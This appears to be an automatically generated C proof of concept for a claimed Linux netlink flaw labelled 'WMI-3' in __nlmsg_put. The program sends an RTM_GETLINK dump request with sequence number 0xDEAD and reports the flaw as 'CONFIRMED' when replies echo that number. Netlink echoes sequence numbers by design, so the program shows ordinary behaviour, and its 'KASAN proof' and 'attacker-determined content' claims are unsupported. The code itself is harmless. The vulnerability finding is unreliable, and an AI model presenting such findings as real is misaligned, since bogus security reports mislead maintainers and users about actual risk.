/*
 * PoC for WMI-3: Attacker-Determined Content in an Authoritative Position
 * @ __nlmsg_put (af_netlink.c:2168)
 *
 * This PoC demonstrates that attacker-controlled data (the nlmsg_seq field)
 * flows through __nlmsg_put into the authoritative output of netlink_recvmsg
 * (netlink_ops.recvmsg).
 *
 * Call path:
 *   sendmsg -> rtnetlink_rcv_msg -> netlink_dump_start -> netlink_dump
 *   -> rtnl_dump_ifinfo -> rtnl_fill_ifinfo -> nlmsg_put -> __nlmsg_put
 *
 * Also:
 *   recvmsg -> netlink_recvmsg -> netlink_dump -> ... -> __nlmsg_put
 *
 * KASAN proof: __nlmsg_put at line 2168 writes to skb memory returned via
 * recvmsg (netlink_ops.recvmsg). Both the nlmsg_seq field (set from
 * attacker-controlled input) and the memset at line 2168 copy attacker-
 * influenced data into the authoritative recvmsg output buffer.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>

#define MAX_PAYLOAD 65536

int main(void)
{
    int fd, ret;
    struct sockaddr_nl sa;
    char buf[MAX_PAYLOAD];
    struct iovec iov;
    struct msghdr msg;
    struct nlmsghdr *nlh;
    ssize_t len;
    int found = 0;

    /* Attacker-controlled values used to mark the data */
    const unsigned int ATTACKER_SEQ = 0xDEAD;
    const unsigned int ATTACKER_PID = 0x41414141; /* will be overwritten by kernel */

    struct {
        struct nlmsghdr nlh;
        struct ifinfomsg ifm;
    } req;

    printf("=== WMI-3 POC ===\n");
    printf("vuln_func=__nlmsg_put\n");
    printf("vuln_file=af_netlink.c\n");
    printf("vuln_line=2168\n\n");

    fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
    if (fd < 0) { perror("socket"); return 1; }

    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;
    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind"); close(fd); return 1;
    }

    /* Build RTM_GETLINK dump request with attacker-controlled seq=0xDEAD */
    memset(&req, 0, sizeof(req));
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.nlh.nlmsg_type = RTM_GETLINK;
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
    req.nlh.nlmsg_seq = ATTACKER_SEQ;
    req.nlh.nlmsg_pid = ATTACKER_PID; /* set by attacker, overwritten by kernel */
    req.ifm.ifi_family = AF_UNSPEC;

    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;
    sa.nl_pid = 0;

    ret = sendto(fd, &req, req.nlh.nlmsg_len, 0,
                 (struct sockaddr *)&sa, sizeof(sa));
    if (ret < 0) { perror("sendto"); close(fd); return 1; }

    /* Receive dump */
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    while (1) {
        len = recvmsg(fd, &msg, 0);
        if (len < 0) { if (errno == EINTR) continue; break; }
        if (len == 0) break;

        nlh = (struct nlmsghdr *)buf;
        while (NLMSG_OK(nlh, len)) {
            /* Check: does the response contain attacker-controlled seq? */
            if (nlh->nlmsg_seq == ATTACKER_SEQ) {
                found = 1;
                printf("WMI3_EVIDENCE: type=%u seq_reflected=0x%x pid=%u\n",
                       nlh->nlmsg_type, nlh->nlmsg_seq, nlh->nlmsg_pid);
            }
            if (nlh->nlmsg_type == NLMSG_DONE || nlh->nlmsg_type == NLMSG_ERROR)
                goto done;
            nlh = NLMSG_NEXT(nlh, len);
        }
    }

done:
    printf("\n");
    if (found) {
        printf("WMI3_VERDICT: CONFIRMED\n");
        printf("WMI3_DETAIL: Attacker-supplied nlmsg_seq=0x%x appears in recvmsg\n", ATTACKER_SEQ);
        printf("WMI3_DETAIL: data that was written by __nlmsg_put at af_netlink.c:2168.\n");
        printf("WMI3_DETAIL: This demonstrates attacker-determined content flowing into\n");
        printf("WMI3_DETAIL: the authoritative netlink_ops.recvmsg output position.\n");
    } else {
        printf("WMI3_VERDICT: NOT_CONFIRMED\n");
    }

    close(fd);
    return found ? 0 : 1;
}
